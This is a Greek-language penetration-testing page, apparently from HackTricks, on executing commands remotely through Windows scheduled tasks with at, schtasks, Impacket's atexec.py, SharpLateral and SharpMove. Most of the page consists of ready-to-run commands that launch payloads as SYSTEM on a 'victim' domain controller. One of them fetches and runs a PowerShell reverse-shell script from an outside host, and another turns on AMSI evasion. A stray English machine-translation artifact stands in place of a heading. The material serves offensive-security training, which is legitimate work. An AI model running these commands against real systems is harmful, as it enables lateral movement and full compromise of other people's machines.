# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργεί

Με administrative access σε έναν Windows host, ένας χειριστής μπορεί να δημιουργήσει και να εκκινήσει ένα scheduled task απομακρυσμένα. Η επιλογή `/S` επιλέγει τον απομακρυσμένο host, οι επιλογές `/U` και `/P` παρέχουν credentials για τη δημιουργία του task όταν απαιτείται, και η `/RU` επιλέγει τον λογαριασμό υπό τον οποίο εκτελείται το task. Η εντολή που αναφέρεται από την `/TR` πρέπει να υπάρχει στο απομακρυσμένο σύστημα.<sup>[[1]](#references)</sup>

Η παλαιότερη εντολή `at` μπορεί επίσης να προγραμματίσει μια εντολή σε έναν απομακρυσμένο host όταν εκτελείται η υπηρεσία Schedule. Εκτελεί τα scheduled jobs υπό τον service account, ο οποίος είναι συνήθως ο `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Δημιουργήστε την εργασία και, στη συνέχεια, ξεκινήστε την:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Please provide the English text to translate.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Για μια επαναλαμβανόμενη εβδομαδιαία εργασία, χρησιμοποιήστε ένα έγκυρο εβδομαδιαίο πρόγραμμα και καθορίστε ρητά την ημέρα:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Μια ενέργεια task μπορεί επίσης να καλέσει απευθείας το PowerShell. Το ακόλουθο lab example κατεβάζει και εκτελεί ένα script· φιλοξενήστε το payload μόνο σε υποδομή που είναι εξουσιοδοτημένη για την αξιολόγηση:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Το `atexec.py` του Impacket αυτοματοποιεί την απομακρυσμένη εκτέλεση εντολών μέσω της υπηρεσίας Task Scheduler και υποστηρίζει authentication με password, NTLM-hash ή Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Το SharpLateral παρέχει μια μέθοδο εκτέλεσης μέσω προγραμματισμένης εργασίας:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Το SharpMove παρέχει μια ακόμη υλοποίηση του Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Περισσότερες πληροφορίες σχετικά με τη [**χρήση του schtasks με silver tickets εδώ**](../active-directory-methodology/silver-ticket.md#host).

Αφαιρέστε τις testing tasks μετά τη χρήση:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - δημιουργία schtasks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - εντολή `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
